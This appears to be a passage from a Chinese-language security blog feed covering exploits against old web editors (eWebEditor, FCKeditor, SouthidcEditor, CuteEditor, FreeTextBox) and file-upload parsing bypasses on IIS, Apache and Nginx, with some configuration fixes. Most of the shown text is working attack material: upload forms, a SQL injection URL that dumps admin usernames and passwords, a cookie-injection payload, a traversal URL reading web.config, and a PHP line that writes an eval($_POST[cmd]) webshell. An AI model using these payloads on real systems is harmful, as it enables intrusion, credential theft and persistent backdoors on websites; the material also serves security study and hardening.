<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/ewebeditor/asp/upload.asp?action=savetype=image&amp;style=popup&amp;cusdir=a.asp"</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">name</span>=<span class="string">myform</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">file</span> <span class="attr">name</span>=<span class="string">uploadfile</span> <span class="attr">size</span>=<span class="string">100</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">upload</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="03-SouthidcEditor编辑器"><a href="#03-SouthidcEditor编辑器" class="headerlink" title="03-SouthidcEditor编辑器"></a>03-SouthidcEditor编辑器</h2><ul>
<li><p>这个和ewebeditor一样 南方数据、良精系统、网软天下等程序后台都是这个编辑器</p>
</li>
<li><p>直接爆管理帐号密码</p>
<p><code>http://127.0.0.1/NewsType.asp?SmallClass=&#39;%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20&#39;&#39;=&#39;</code></p>
</li>
<li><p>cookie注入</p>
<p><code>http://127.0.0.1/NewsType.asp?id=XX</code></p>
</li>
<li><p>清空地址栏，利用union语句来注入</p>
<p><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin&quot;))</code></p>
<p>然后在访问：/NewsType.asp 就爆出来了。</p>
</li>
<li><p>SouthidcEditor默认数据库</p>
<p><code>http://127.0.0.1/southidceditor/datas/southidceditor.mdb</code></p>
</li>
<li><p>默认登录地址</p>
<ul>
<li><code>http://127.0.0.1/southidceditor/admin/admin_login.asp</code></li>
<li><code>http://127.0.0.1/southidceditor/login.asp</code></li>
<li>如果没有默认登陆页面 只要你登录进后台直接打开<br><code>http://127.0.0.1/admin/Southidceditor/admin_style.asp</code></li>
</ul>
</li>
</ul>
<h2 id="04-FCKeditor"><a href="#04-FCKeditor" class="headerlink" title="04-FCKeditor"></a>04-FCKeditor</h2><ul>
<li><p>查看编辑器版本 FCKeditor/_whatsnew.html</p>
</li>
<li><p>Version 2.2 版本</p>
<p>Apache+linux 环境下在上传文件后面加个.突破！测试通过。</p>
</li>
<li><p>Version &lt;=2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！</p>
<ul>
<li><p>将以下保存为html文件，修改action地址。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"frmUpload"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span></span></span><br><span class="line"><span class="tag"><span class="attr">action</span>=<span class="string">"http://127.0.0.1/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span>Upload a new file:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"NewFile"</span> <span class="attr">size</span>=<span class="string">"50"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnUpload"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Upload"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>FCKeditor 文件上传“.”变“_”下划线的绕过方法</p>
<ul>
<li>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化。 </li>
<li>提交shell.php+空格绕过，不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试。</li>
<li>继续上传同名文件可变为shell.php;(1).jpg，也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。</li>
</ul>
</li>
<li><p>突破建立文件夹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2FSilic.asp&amp;NewFolderName=z&amp;uuid=1244789975684 </span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=Silic.asp </span><br><span class="line"></span><br><span class="line">editor/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/Silic.asp&amp;NewFolderName=k.asp</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆路径漏洞</p>
<p><code>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/Silic.asp</code></p>
</li>
</ul>
<h2 id="05-CuteEditor编辑器"><a href="#05-CuteEditor编辑器" class="headerlink" title="05-CuteEditor编辑器"></a>05-CuteEditor编辑器</h2><ul>
<li><p>方法1</p>
<ul>
<li><p>直接下载load.ashx配置文件</p>
<p><code>http://127.0.0.1/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</code></p>
</li>
<li><p>然后查看一些sql配置信息 从sql数据库连接入手</p>
</li>
<li><p>方法2</p>
<ul>
<li>2003 iis解析(后台拿webshell)</li>
<li>填加新闻–上传音乐、视频等图标—新建目录xx.asp，然后上传小马1.avi，菜刀连接</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="06-freetextbox编辑器"><a href="#06-freetextbox编辑器" class="headerlink" title="06-freetextbox编辑器"></a>06-freetextbox编辑器</h2><ul>
<li>漏洞描述：所有版本，没做登陆验证可以直接访问上传木马，FTBv3-3-1 可以直接上传任意格式的文件</li>
<li>Freetextbox 1.6.3 及其他版本可以上传格式为：1.asp;.jpg 文件 上传后木马地址为<a href="http://127.0.0.1/images/1.asp;.jpg" target="_blank" rel="noopener">http://127.0.0.1/images/1.asp;.jpg</a></li>
<li>漏洞文件：ftb.imagegallery.aspx</li>
<li><a href="http://127.0.0.1/freetextbox/ftb.imagegallery.aspx?frame=1”在地址后面加上&amp;rif=..&amp;cif=." target="_blank" rel="noopener">http://127.0.0.1/freetextbox/ftb.imagegallery.aspx?frame=1”在地址后面加上&amp;rif=..&amp;cif=.</a>.</li>
<li>再访问 整个网站的目录就呈现在眼前了,下面还有上传删除等按钮</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>漏洞</tag>
        <tag>上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>上传及解析漏洞</title>
    <url>/2018/01/22/web/%E4%B8%8A%E4%BC%A0%E5%8F%8A%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="上传解析相关"><a href="#上传解析相关" class="headerlink" title="上传解析相关"></a>上传解析相关</h1><blockquote>
<p><a href="https://thief.one/%2F2016%2F09%2F22%2F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85%2F" target="_blank" rel="noopener">https://thief.one/%2F2016%2F09%2F22%2F%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85%2F</a></p>
</blockquote>
<h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01-简介"></a>01-简介</h2><ul>
<li>文件上传<ul>
<li>常识：文件后缀必须同文件代码保持一致</li>
<li>解析漏洞原因及条件：web搭建平台相关</li>
<li>IIS,Apache,Nginx</li>
<li>以其他格式后缀执行出后门格式效果</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li>IIS6.0 <ul>
<li>文件类型<ul>
<li>正常：<a href="http://www.xxx.com/logo.jpg" target="_blank" rel="noopener">www.xxx.com/logo.jpg</a></li>
<li>触发漏洞：<a href="http://www.xxx.com/logo.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/logo.asp;.jpg</a></li>
</ul>
</li>
<li>文件夹类型<ul>
<li>正常：<a href="http://www.xxx.com/image/qq.jpg" target="_blank" rel="noopener">www.xxx.com/image/qq.jpg</a></li>
<li>触发漏洞：<a href="http://www.xxx.com/image.asp/qq.jpg" target="_blank" rel="noopener">www.xxx.com/image.asp/qq.jpg</a></li>
</ul>
</li>
</ul>
</li>
<li>Iis7.x uginx<ul>
<li>正常：<a href="http://www.xxx.com/qq.jpg" target="_blank" rel="noopener">www.xxx.com/qq.jpg</a></li>
<li>有漏洞：<a href="http://www.xx.com/qq.jpg/*.php" target="_blank" rel="noopener">www.xx.com/qq.jpg/*.php</a></li>
<li>备注：存在漏洞，即文件被当作php程序解析</li>
</ul>
</li>
<li>Apache低版本<ul>
<li>正常：<a href="http://www.xxx.com/qq.jpg" target="_blank" rel="noopener">www.xxx.com/qq.jpg</a></li>
<li>有漏洞：<a href="http://www.xxx.com/qq.php.xxxx" target="_blank" rel="noopener">www.xxx.com/qq.php.xxxx</a></li>
<li>备注：存在漏洞，向上逐次解析</li>
</ul>
</li>
<li>获取网站的搭建平台<ul>
<li>推荐方法：直接通过网站浏览器自带的审查元素功能监听数据包获取</li>
<li>浏览器F12</li>
<li>响应包Server字段</li>
</ul>
</li>
<li>思考解析漏洞利用场景<br>后台或其他应用上传文件时，情况如下：<ul>
<li>客户端和服务端命名一致</li>
<li>客户端和服务端命名不一致（时间，随机等）</li>
</ul>
</li>
</ul>
<h2 id="02-文件上传校验姿势"><a href="#02-文件上传校验姿势" class="headerlink" title="02-文件上传校验姿势"></a>02-文件上传校验姿势</h2><ul>
<li>客户端javascript校验（一般只校验后缀名</li>
<li>服务端校验<ul>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
</ul>
</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h3 id="2-1-客户端校验"><a href="#2-1-客户端校验" class="headerlink" title="2.1-客户端校验"></a>2.1-客户端校验</h3><ul>
<li>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</li>
<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
</ul>
<h3 id="2-2-服务端校验"><a href="#2-2-服务端校验" class="headerlink" title="2.2-服务端校验"></a>2.2-服务端校验</h3><ul>
<li><p>content-type字段校验</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  </span><br><span class="line">    <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">    &#123;   </span><br><span class="line">     	<span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">    $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误</li>
<li>通过检验<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>的type字段；</li>
</ul>
</li>
<li><p>通过检验<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;]</code>的type字段；</p>
<p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系</p>
<ul>
<li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li>
<li>.gif，”GIF 89A”</li>
<li>.zip，”Zip Compressed”</li>
<li>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
</ul>
</li>
</ul>
<h2 id="03-文件上传绕过校验"><a href="#03-文件上传绕过校验" class="headerlink" title="03-文件上传绕过校验"></a>03-文件上传绕过校验</h2><ul>
<li>客户端绕过（抓包改包）</li>
<li><p>服务端绕过</p>
</li>
<li><ul>
<li>文件类型</li>
<li>文件头</li>
<li>文件后缀名</li>
</ul>
</li>
</ul>
<ul>
<li>配合文件包含漏洞绕过</li>
<li>配合服务器解析漏洞绕过</li>
<li>CMS、编辑器漏洞绕过</li>
<li>配合操作系统文件命名规则绕过</li>
<li>配合其他规则绕过</li>
<li>WAF绕过</li>
</ul>
<h3 id="3-1-客户端绕过"><a href="#3-1-客户端绕过" class="headerlink" title="3.1-客户端绕过"></a>3.1-客户端绕过</h3><ul>
<li>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</li>
</ul>
<h3 id="3-2-服务端绕过"><a href="#3-2-服务端绕过" class="headerlink" title="3.2-服务端绕过"></a>3.2-服务端绕过</h3><ul>
<li><p>文件类型绕过</p>
<ul>
<li>我们可以通过抓包，将content-type字段改为image/gif</li>
<li>content-type字段</li>
</ul>
</li>
<li><p>文件头绕过</p>
<ul>
<li>在木马内容基础上再加了一些文件信息，有点像下面的结构<br><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></li>
<li>添加文件头</li>
</ul>
</li>
<li><p>文件后缀名绕过</p>
<ul>
<li><p>前提：黑名单校验（黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件)</p>
</li>
<li><p>绕过方法：</p>
<ul>
<li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li>
<li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li>
</ul>
</li>
<li><p>能被解析的文件扩展名列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsp jspx jspf</span><br><span class="line">asp asa cer aspx</span><br><span class="line">php php php3 php4</span><br><span class="line">exe exee</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="3-3-配合文件包含漏洞"><a href="#3-3-配合文件包含漏洞" class="headerlink" title="3.3-配合文件包含漏洞"></a>3.3-配合文件包含漏洞</h3><ul>
<li><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
</li>
<li><p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
<ul>
<li><p>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容</p>
</li>
<li><p>然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;</p>
</li>
<li><p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP    </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">#ASP    </span></span><br><span class="line">&lt;!--<span class="comment">#include file="上传的txt文件路径" --&gt;</span></span><br><span class="line"><span class="comment">#JSP    </span></span><br><span class="line">&lt;jsp:inclde page=<span class="string">"上传的txt文件路径"</span>/&gt;</span><br><span class="line"><span class="keyword">or</span>  </span><br><span class="line">&lt;%@<span class="keyword">include</span> file=<span class="string">"上传的txt文件路径"</span>%&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>这个php文件可看做是一个存在文件包含漏洞的文件的代表；</p>
</li>
</ul>
</li>
</ul>
<h3 id="3-4-配合服务器解析漏洞"><a href="#3-4-配合服务器解析漏洞" class="headerlink" title="3.4-配合服务器解析漏洞"></a>3.4-配合服务器解析漏洞</h3><h4 id="3-4-1-IIS5-x-6-x"><a href="#3-4-1-IIS5-x-6-x" class="headerlink" title="3.4.1-IIS5.x-6.x"></a>3.4.1-IIS5.x-6.x</h4><ul>
<li><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
</li>
<li><p>目录解析(6.0)</p>
<ul>
<li>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp/xx.jpg</a></li>
<li>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</li>
</ul>
</li>
<li><p>文件解析</p>
<ul>
<li>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a></li>
<li>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</li>
</ul>
</li>
<li><p>解析文件类型</p>
<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
<ul>
<li>/test.asa</li>
<li>/test.cer</li>
<li>/test.cdx</li>
</ul>
</li>
<li><p>修复方案</p>
<ul>
<li>目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名</li>
<li>做好权限设置，限制用户创建文件夹。</li>
</ul>
</li>
</ul>
<h4 id="3-4-2-apache"><a href="#3-4-2-apache" class="headerlink" title="3.4.2-apache"></a>3.4.2-apache</h4><ul>
<li><p>漏洞原理</p>
<ul>
<li>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。</li>
<li>比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li>
<li>注意<ul>
<li>同时以module方式使apache与php结合，测试发现确实存在这样的解析漏洞。；</li>
<li>将apache与php的结合方式修改为fastcgi方式，测试发现爆500错误，不存在这样的解析漏洞。</li>
<li>详情：<a href="http://www.cnblogs.com/milantgh/p/5116955.html" target="_blank" rel="noopener">http://www.cnblogs.com/milantgh/p/5116955.html</a></li>
</ul>
</li>
</ul>
</li>
<li><p>漏洞形式</p>
<p><code>www.xxxx.xxx.com/test.php.php123</code></p>
<ul>
<li>原来文件后缀就是.php123，就是说此文件test.php.php123真实存在于服务器，而不是现访问浏览器构造的url；</li>
<li>大体就是这样，但是phpstudy或腾讯云apache测试时，并没有此解析漏洞，php代码为文本形式显示；</li>
<li>docker中测试成功，2.php.php123.php345内容为phpinfo();按照这种后缀，能当php解析；</li>
</ul>
</li>
<li><p>尝试修复</p>
<ul>
<li><p>方法1，</p>
<ul>
<li><p>apache配置文件，禁止.php.这样的文件执行</p>
</li>
<li><p>配置文件里面加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后重启，service httpd restart</p>
</li>
</ul>
</li>
<li><p>方法2：</p>
<ul>
<li><p>伪静态方法（先撤销上面方法1的修改）</p>
<ul>
<li><p>首先apache要开启htaccess的使用<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="noopener">http://www.jb51.net/article/25476.htm</a></p>
</li>
<li><p>修改配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将:（&lt;/Directory &quot;/var/www/html&quot;&gt;中的）</span><br><span class="line">Options FollowSymLinks</span><br><span class="line">AllowOverride None</span><br><span class="line"></span><br><span class="line">改为</span><br><span class="line">Options FollowSymLinks</span><br><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后，修补成功，自动跳转到主页</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>其余配置问题导致漏洞</p>
<ul>
<li><p>如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行</p>
</li>
<li><p>如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行</p>
</li>
<li><p>修复方案</p>
<ul>
<li><p>apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>（首先开启.htaccess，见上面修补方法2）用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule .(php.|php3.) /index.php</span><br><span class="line">RewriteRule .(pHp.|pHp3.) /index.php</span><br><span class="line">RewriteRule .(phP.|phP3.) /index.php</span><br><span class="line">RewriteRule .(Php.|Php3.) /index.php</span><br><span class="line">RewriteRule .(PHp.|PHp3.) /index.php</span><br><span class="line">RewriteRule .(PhP.|PhP3.) /index.php</span><br><span class="line">RewriteRule .(pHP.|pHP3.) /index.php</span><br><span class="line">RewriteRule .(PHP.|PHP3.) /index.php</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-4-2-nginx解析漏洞"><a href="#2-4-2-nginx解析漏洞" class="headerlink" title="2.4.2-nginx解析漏洞"></a>2.4.2-nginx解析漏洞</h4><ul>
<li><p>简介</p>
<ul>
<li><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。</p>
</li>
<li><p>当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。</p>
</li>
<li><p>如果开启了这个选项，那么就会触发在PHP中的如下逻辑</p>
</li>
<li><p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">——www.xx.com/phpinfo.jpg/1.php这个URL时；</span><br><span class="line">——$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”；</span><br><span class="line">——开启fix_pathinfo这个选项</span><br><span class="line">——SCRIPT_FILENAME是phpinfo.jpg；</span><br><span class="line">——1.php是PATH_INFO</span><br><span class="line">——phpinfo.jpg作为PHP文件来解析了</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>测试：</p>
<ul>
<li><p>2.jpg文件，内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">访问：http://127.0.0.1/test/2.jpg</span><br><span class="line">错误</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/1.php</span><br><span class="line">正常</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.php1111</span><br><span class="line">正常；</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.ph1p1111</span><br><span class="line">错误；</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.jpgphp</span><br><span class="line">错误；</span><br><span class="line"></span><br><span class="line">访问：http://127.0.0.1/test/2.jpg/dcc.jpg.php</span><br><span class="line">正常；</span><br></pre></td></tr></table></figure>
</li>
<li><p>小结：</p>
<ul>
<li>/后面必须含有字符串“.php”；</li>
<li>/1.jpg%00.php，这样会失败；</li>
</ul>
</li>
</ul>
</li>
<li><p>漏洞形式</p>
<ul>
<li><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php（成功）" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/1.php（成功）</a></li>
</ul>
</li>
</ul>
<ul>
<li><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php（失败）" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg%00.php（失败）</a></li>
<li><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php（成功）" target="_blank" rel="noopener">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php（成功）</a></li>
</ul>
<ul>
<li><p>另一种姿势</p>
<ul>
<li><p>上传一个名字为test.jpg，以下内容的文件。</p>
<p>·<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
</li>
<li><p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</p>
</li>
<li><p>修复</p>
<ul>
<li><p>修改php.ini文件，将cgi.fix_pathinfo的值设置为0;</p>
</li>
<li><p>在Nginx配置文件中添加以下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( $fastcgi_script_name ~ ..*/.*php ) &#123;</span><br><span class="line">　　<span class="keyword">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-4-4-IIS7-5解析漏洞"><a href="#2-4-4-IIS7-5解析漏洞" class="headerlink" title="2.4.4-IIS7.5解析漏洞"></a>2.4.4-IIS7.5解析漏洞</h4><ul>
<li>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</li>
</ul>
<h3 id="3-5-配合操作系统文件命令规则"><a href="#3-5-配合操作系统文件命令规则" class="headerlink" title="3.5-配合操作系统文件命令规则"></a>3.5-配合操作系统文件命令规则</h3><ul>
<li><p>上传不符合windows文件命名规则的文件名</p>
<ul>
<li><p>会被windows系统自动去掉不符合规则符号后面的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.asp.（点号去掉）</span><br><span class="line">test.asp(空格)（空格去掉）</span><br><span class="line">test.php:1.jpg（冒号去掉）</span><br><span class="line">test.php::$DATA（冒号去掉）</span><br><span class="line">shell.php::$DATA…….（冒号去掉）</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>会被windows系统自动去掉不符合规则符号后面的内容</p>
<ul>
<li>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名</li>
</ul>
</li>
</ul>
<h3 id="3-6-CMS及编辑器漏洞及-htaccess"><a href="#3-6-CMS及编辑器漏洞及-htaccess" class="headerlink" title="3.6-CMS及编辑器漏洞及.htaccess"></a>3.6-CMS及编辑器漏洞及.htaccess</h3><ul>
<li><p>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过</p>
</li>
<li><p>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>
</li>
<li><p>.htaccess利用步骤</p>
